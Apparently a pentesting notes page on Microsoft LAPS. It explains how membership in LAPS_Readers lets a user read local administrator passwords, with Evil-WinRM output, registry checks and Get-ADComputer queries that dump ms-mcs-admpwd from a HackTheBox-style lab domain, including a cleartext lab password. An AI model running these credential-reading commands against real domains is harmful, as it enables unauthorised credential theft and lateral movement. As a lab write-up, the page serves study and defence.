---
description: >-
  Stands for Local Administrator Password Solution (LAPS). Its used for managing
  unique, complex, and frequently changing administrator passwords for
  domain-joined computers.
---

# LAPS

The goal of LAPS is to randomise passwords across the Windows end-points. This is to prevent brute-forcing, hash cracking and lateral movement in the domain joined enviroment. It is common to see groups of users which have permissions to read these passwords.

{% embed url="https://www.youtube.com/watch?ab_channel=AzureAcademy&v=ZGCM-jRsboA" %}
How LAPS works
{% endembed %}

### Vulnerability

A LAPS solution can be compromised if the user who joins a computer to an Active Directory domain has sufficient privileges to read the stored LAPS password. In this example we are member of the LAPS\_Readers group.

```bash
*Evil-WinRM* PS C:\program files\LAPS\CSE> net user svc_deploy
Enter PEM pass phrase:
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

Check if LAPS is running

```bash
# Check for AdmPwd.dll
dir "C:\Program Files\LAPS\CSE"

# Register query
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

### Read password

As member of LAPS\_Readers we can use powershell to read the administrator password. Using Get\_ADComputer we filter out 'ms-mcs-admpwd'.

```bash
# Get objects and ms-mcs-admpwd property
Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : V@cAe{m{/pv7!1q7X06Ii)U7
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :  
```

{% hint style="info" %}
The Get-ADcomputer will retrieve computer objects from the AD. Using the -Filter flag we use it to return "computer". The -property \* flag will return all properties of the computer objects.
{% endhint %}

```bash
# Get-ADcomputer properties
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *

<snip>
modifyTimeStamp                      : 10/18/2024 3:45:30 PM                                               
ms-Mcs-AdmPwd                        : V@cAe{m{/pv7!1q7X06Ii)U7                                            
ms-Mcs-AdmPwdExpirationTime          : 133741971309039826                                                  
msDFSR-ComputerReferenceBL           : {CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=timelapse,DC=htb}
msDS-GenerationId                    : {69, 127, 93, 82...}  
```
